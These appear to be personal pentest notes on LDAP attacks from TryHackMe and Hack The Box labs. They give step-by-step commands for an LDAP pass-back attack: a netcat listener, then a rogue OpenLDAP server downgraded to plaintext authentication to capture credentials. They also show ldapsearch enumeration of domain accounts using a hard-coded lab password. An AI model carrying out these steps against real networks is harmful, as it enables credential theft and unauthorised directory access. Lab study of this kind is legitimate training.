# ldap
[https://vk9-sec.com/enumerating-ad-users-with-ldap/](https://vk9-sec.com/enumerating-ad-users-with-ldap/) 

LDAP Pass-back Attacks
----------------------

We can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

using `nc -lvp 389` we get a callback with creds but it's hidden. We have to host a rogue ldap server with paintext passwords.

### Hosting a Rogue LDAP Server

we will use OpenLDAP, install and configure it with:

```text-plain
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
sudo dpkg-reconfigure -p low slapd
```

Terminal Prompt Steps:

1.  Make sure to press <No> when requested if you want to skip server configuration:
2.  For the DNS domain name, you want to provide our target domain, which is `za.tryhackme.com`
3.  Use this same name for the Organisation name as well:
4.  Provide any Administrator password
5.  Select MDB as the LDAP database to use
6.  For the last two options, ensure the database is not removed when purged
7.  Move old database files before a new one is created

Before using the rogue LDAP server, we need to make it vulnerable by downgrading the supported authentication mechanisms. We want to ensure that our LDAP server only supports PLAIN and LOGIN authentication methods. To do this, we need to create a new ldif file, called with the following content:

filename: `olcSaslSecProps.ldif`

```text-plain
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

The file has the following properties:

*   **olcSaslSecProps:** Specifies the SASL security properties
*   **noanonymous:** Disables mechanisms that support anonymous login
*   **minssf:** Specifies the minimum acceptable security strength with 0, meaning no protection.

Now we can use the ldif file to patch our LDAP server using the following:

```text-plain
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
```

We can verify that our rogue LDAP server's configuration has been applied using the following command:

```text-plain
ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
```

to get details about ldap, when you have a password

```text-plain
ldapsearch -v -x -b "DC=support,DC=htb" -H "ldap://$IP" "(objectclass=*)" "sAMAccountName" -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' | grep sAMAccountName
```

for getting `CN` about a specfic group or user, use this:

```text-plain
ldapsearch -v -x -b "CN=support,CN=Users,DC=support,DC=htb" -H "ldap://$IP" "(objectclass=*)" -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```